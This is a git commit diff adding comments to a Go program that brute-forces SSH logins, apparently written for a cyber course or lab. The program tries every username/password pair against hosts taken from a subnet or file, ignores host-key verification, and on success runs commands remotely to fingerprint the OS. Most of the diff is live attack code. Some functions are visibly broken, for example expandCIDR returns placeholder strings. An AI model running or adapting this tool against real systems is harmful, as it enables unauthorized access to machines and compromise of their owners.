15afe936888e4d3eb7c102c66afe0d159d63da95
Quantifiable-Quasar <itsmeamario.tti@gmail.com>
2024-10-08 22:22:57 -0400

    commented code

--- main.go
+++ main.go
@@ -30,7 +30,7 @@ func check(e error) {
 }
 
 func readFile(filename string) string {
-	// Reads file into a string
+	// reads file into a string
 	fileBytes, err := ioutil.ReadFile(filename)
 	check(err)
 	fileString := string(fileBytes)
@@ -45,6 +45,8 @@ func readLines(path string) ([]string, error) {
 	}
 
 	defer file.Close()
+
+	// create list and append each line of the file to it
 	var lines []string
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
@@ -55,7 +57,9 @@ func readLines(path string) ([]string, error) {
 }
 
 func sshDialer(user string, pass string, rhost string, timeoutPtr *int) bool {
-	// Attempts to make a SSH connection and returns whether that connectino was sucessful or not
+	// Attempts to make a SSH connection and returns whether that connection was sucessful or not
+
+	// SSH config stuff
 	config := &ssh.ClientConfig{
 		User: user,
 		Auth: []ssh.AuthMethod{
@@ -64,7 +68,11 @@ func sshDialer(user string, pass string, rhost string, timeoutPtr *int) bool {
 		Timeout:         time.Duration(*timeoutPtr) * time.Millisecond,
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 	}
+
+	// initiate ssh connection
 	_, err := ssh.Dial("tcp", rhost+":22", config)
+
+	// don't want to use check() here because this failure shouldn't kill the enitre program
 	if err != nil {
 		return false
 	}
@@ -74,11 +82,16 @@ func sshDialer(user string, pass string, rhost string, timeoutPtr *int) bool {
 // change list param to pointer
 func findUser(userList []string, passList []string, rhost string, timeoutPtr *int) (string, string) {
 	// function to find a valid login for a remote host over SSH
+
+	// brute force all usernames (i) and all passwords (j)
 	for _, i := range userList {
 		for _, j := range passList {
 			fmt.Printf("%s:%s\n", i, j)
+
+			// try each connection and return valid login combo
 			if sshDialer(i, j, rhost, timeoutPtr) {
 				fmt.Printf("Correct combination!\n")
+				// TODO maybe add an option to get all valid logins or maybe find root login?
 				return i, j
 			}
 		}
@@ -88,6 +101,8 @@ func findUser(userList []string, passList []string, rhost string, timeoutPtr *in
 
 func sendCMD(rhost, cmd string) (string, error) {
 	// send a command to the remote host over SSH
+
+	// SSH config
 	config := &ssh.ClientConfig{
 		User: validUser,
 		Auth: []ssh.AuthMethod{
@@ -96,37 +111,55 @@ func sendCMD(rhost, cmd string) (string, error) {
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 	}
 
+	// initiate SSH connection
 	client, err := ssh.Dial("tcp", rhost+":22", config)
+
+	// don't use check() as to not kill program if one endpoint fails
 	if err != nil {
+		//  this is ssh dial error (should never happen but you never know)
 		return "", err
 	}
 	session, err := client.NewSession()
 	if err != nil {
+		// this is the session error
 		return "", err
 	}
 	defer session.Close()
+
+	// b is stdout from remote host
 	var b bytes.Buffer
 	session.Stdout = &b
+
+	// send command and record if there is an error
 	err = session.Run(cmd)
+
+	// return stdout and error
 	return b.String(), err
 }
 
 func expandCIDR(network string) []string {
 	// expands a CIDR notated IP into a list of all the possible IP addresses it could be
+
+	// get string into a net object for better manipulation
 	_, ipv4Net, err := net.ParseCIDR(network)
 	check(err)
 
+	// find netmask and start ip
 	mask := binary.BigEndian.Uint32(ipv4Net.Mask)
 	start := binary.BigEndian.Uint32(ipv4Net.IP)
 
+	// find the end value (i.e. a /25 will be 64)
 	finish := (start & mask) | (mask ^ 0xffffffff)
 
+	// loop through all ips in the subnet
 	for i := start; i > finish; i++ {
 		ip := make(net.IP, 4)
 		binary.BigEndian.PutUint32(ip, i)
 		fmt.Println(i)
 	}
 
+	// i dont really remember why this is here. probably should return the list of ips
+	// TODO fix this
 	return []string{"a", "b"}
 }
 
@@ -141,37 +174,53 @@ func main() {
 
 	var ipList []string
 
+	// if else to pick where ips are coming from
 	if *rnetPointer != "" {
+		// pass subnet from cmdline
 		ipListTmp := expandCIDR(*rnetPointer)
 		ipList = ipListTmp
 
 	} else {
+		// get ips from txt file
 		ipListTmp, err := readLines(*ipFilePtr)
-		check(err)
+
+		// help user out a bit
+		if err != nil {
+			flag.PrintDefaults()
+			log.Fatal(err)
+		}
+
+		// had to do these shenanagans because the := wouldn't let me use ipList up there
+		// TODO fix this
 		ipList = ipListTmp
 
 	}
 
+	// main brute force loop
 	for _, host := range ipList {
 
 		fmt.Printf("Now working on: %s\n", host)
 
+		// select the user and password lists
+		// TODO why is this in the for loop??
 		if *userFilePtr == "" {
-			userList = []string{"one", "cyberstudent", "three"}
+			userList = []string{"one", "tm", "three"}
 		} else {
 			userListTmp, err := readLines(*userFilePtr)
 			check(err)
 			userList = append(userList, userListTmp...)
 		}
 		if *passFilePtr == "" {
-			passList = []string{"a", "teach a man to phish", "f"}
+			passList = []string{"a", "tm", "f"}
 		} else {
 			passListTmp, err := readLines(*passFilePtr)
 			check(err)
 			passList = append(passList, passListTmp...)
 		}
+
 		validUser, validPass = findUser(userList, passList, host, timeoutPtr)
 
+		// rut ro raggy
 		if validUser == "" || validPass == "" {
 			fmt.Println("Failed to find valid creds :(")
 		}
@@ -181,6 +230,9 @@ func main() {
 		_, linuxErr := sendCMD(host, "uname")
 		_, winErr := sendCMD(host, "cmd /c ver")
 
+		// if the command works then we assume that is the os
+		// wsl might break somethign like this. would need to test there
+		// also pretending like mac and unix dont exist
 		if linuxErr == nil {
 			operatingSystem = "Linux"
 		} else if winErr == nil {
